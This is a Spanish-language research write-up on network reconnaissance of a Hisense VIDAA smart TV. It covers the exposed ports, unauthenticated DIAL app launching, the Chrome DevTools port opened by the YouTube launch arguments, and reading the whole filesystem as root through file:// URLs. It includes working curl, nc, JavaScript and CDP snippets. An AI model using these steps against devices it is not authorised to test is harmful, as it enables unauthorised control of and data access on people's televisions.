# 02 — Reconocimiento de red: los cuatro puertos que importan

El televisor, en una LAN doméstica, expone muy poco. El escaneo completo (1-65535 TCP) tardó
unos 6 minutos y encontró **cuatro** servicios.

## Resultado del escaneo

| Puerto | Qué es | Detalle |
|---|---|---|
| **56789** | **DIAL** (aplicaciones) | `GET /apps/<App>` devuelve estado; `POST` la lanza |
| **56790** | Descripción del dispositivo | `GET /dd.xml` → `Application-URL: http://<ip>:56789/apps/` |
| **9080** | Netflix MDX | HTTP 200 con cuerpo `status=ok` |
| 1969 | Servicio sin banner | Acepta y cierra. En `/proc/net/tcp` resulta ser `logservice` |

Después, cuando corre una app de internet, aparece un quinto puerto — y es el importante:

| Puerto | Qué es |
|---|---|
| **9222** | **Chrome DevTools Protocol** del navegador de apps (solo mientras la app corre) |

Y uno más, ya con acceso: `3579` en `127.0.0.1` es el FIFO de control de `app_man`.

## Descubrimiento SSDP

```
M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MAN: "ssdp:discover"
MX: 3
ST: ssdp:all
```

Responde con `LOCATION: http://<ip>:9080`, `SERVER: Linux/3.10.27, UPnP/1.0, Portable SDK for
UPnP devices/1.6.13` y `X-User-Agent: NRDP MDX`.

## DIAL: lanzar aplicaciones sin autenticación

```
GET    http://<ip>:56789/apps/YouTube     -> <state>stopped</state>
POST   http://<ip>:56789/apps/YouTube     -> 201 Created, Location: /apps/YouTube/run
DELETE http://<ip>:56789/apps/YouTube/run -> 200 (termina el proceso de verdad)
```

Esto **no es una particularidad**: es el **CVE-2026-123994** ("Hisense VIDAA Smart TV DIAL
Service Unauthenticated Access"), con el puerto 56789 exactamente. Permite enumerar y lanzar
apps y terminar sesiones. Es un CWE-306 (falta de autenticación), severidad media.

> Ojo: el seguimiento de estado del DIAL es poco confiable. Después de un `DELETE` puede seguir
> diciendo `running` aunque el proceso ya murió. Verificar por otro lado.

## El hallazgo que abrió todo: DevTools en 9222

En `/basic/am_config` (la configuración de apps del launcher) la app `youtube` se lanza así:

```
exec = /3rd/internet_browser/browser
args = -w 1280 -h 720 -x youtube -m NO -u http://www.youtube.com/tv
       --hw-dfb --allow-file-access-from-files --remote-debugging-port=9222
       --log-level=0 --dfb-window-mode --enable-impl-side-painting
```

`--remote-debugging-port=9222` es el canal de depuración de Chromium. Con DIAL se lanza YouTube y
el puerto se abre; desde ahí:

```
GET http://<ip>:9222/json          -> lista de páginas con su webSocketDebuggerUrl
    ws://<ip>:9222/devtools/page/… -> Runtime.evaluate, Page.navigate, Page.captureScreenshot
```

Con eso se puede **ejecutar JavaScript, navegar y capturar la pantalla** del televisor. Ese canal
es lo que permitió leer el sistema de archivos completo y, después, llegar a una `.so` propia.

> Limitación: solo existe mientras corre una app de *internet*. El menú principal (Presto) no
> expone DevTools; sus lanzadores fijan `BROWSER_DEBUG=NO`.

## Lectura de todo el sistema de archivos con `file://localhost`

Esto se descubrió casi por accidente, y es la razón por la que se pudo mapear el sistema **antes**
de conseguir una shell: **el navegador del televisor lee y lista archivos locales** sin ninguna
vulnerabilidad de por medio.

### Lo que se ve al navegar

En el navegador de la interfaz (Presto), ir a:

```
file://localhost/
```

muestra el **listado del directorio raíz** del televisor. Y de ahí se puede seguir navegando por
`/etc`, `/sbin`, `/basic`, `/3rd`, `/3rd_rw`, etc. También se abren archivos de texto directamente
(por ejemplo `file://localhost/etc/inittab`).

Esto funciona porque **la propia interfaz del televisor es una página `file://`**:

```
file://localhost/3rd_rw/UI/hisenseUI/index.html
```

El motor está configurado para servir la UI desde disco, así que el acceso a archivos locales está
habilitado por diseño. El navegador de apps de internet además se lanza con
`--allow-file-access-from-files`.

### Leer archivos de forma automatizada

Una página **servida por HTTP** (desde tu PC o desde el propio televisor) puede leer archivos del
televisor con un `XMLHttpRequest` **síncrono** a `file://localhost/...`:

```js
var x = new XMLHttpRequest();
x.open('GET', 'file://localhost/etc/inittab', false);   // false = síncrono
x.send(null);
var contenido = x.responseText;      // ¡el archivo completo!
```

El motor **no aplica la política de mismo origen** entre `http://` y `file://`, así que una página
HTTP común puede leer el disco. Con eso se leyó, archivo por archivo: `/etc/inittab`, todo
`/etc/rc.d`, `/etc/scripts/*`, `/etc/fstab`, `/sbin/*` y más — sin fotos de pantalla.

> **Trampa metodológica:** este método **no distingue** entre un archivo inexistente, un
> directorio y un archivo de 0 bytes: los tres devuelven `status=0, len=0` sin excepción. Para
> saber si algo existe hay que usar otra vía (listado real, o buscar la cadena dentro de un
> binario).

### Mejor todavía: listados reales por DevTools

El navegador de apps (OMI/Chromium) **sí renderiza listados de directorio** cuando se navega a una
URL `file://`. Combinado con DevTools ([sección anterior](#el-hallazgo-que-abrió-todo-devtools-en-9222)):

```python
cdp(1, "Page.navigate", {"url": "file:///3rd_rw/UI/hisenseUI/index.html"})
print(cdp(2, "Runtime.evaluate", {"expression": "document.body.innerText"})["result"]["result"]["value"])
```

Así se leyeron completos `index.html` de la interfaz, `hiUISDK.js` (465 KB) y los logs de error del
navegador, que revelaron cómo se lanza cada app.

### Por qué importa

El navegador corre como **root**. Todo lo que root puede leer, la página lo puede leer. Es
reconocimiento de sistema operativo completo —mapa de particiones, scripts de arranque, servicios,
versiones de bibliotecas— **sin explotar nada**, y es lo que permitió planear el resto del trabajo
con información en lugar de suposiciones.

## Reproducir el reconocimiento

```sh
# ¿está vivo?
ping -c2 <ip>

# puertos que importan
for p in 1969 56789 56790 9080 9222; do nc -vz -w2 <ip> $p; done

# descripción
curl -s http://<ip>:56790/dd.xml

# lanzar YouTube y leer DevTools
curl -s -X POST -d '' -H 'Content-Type: text/plain' http://<ip>:56789/apps/YouTube
sleep 5 && curl -s http://<ip>:9222/json | head
```

## Lección

Antes de buscar un exploit de memoria, conviene mirar qué servicios expone el equipo y **qué
argumentos usa para lanzar sus propias apps**. En este caso el fabricante dejó abierto un canal de
depuración completo; no hizo falta ninguna vulnerabilidad de corrupción de memoria para entrar.
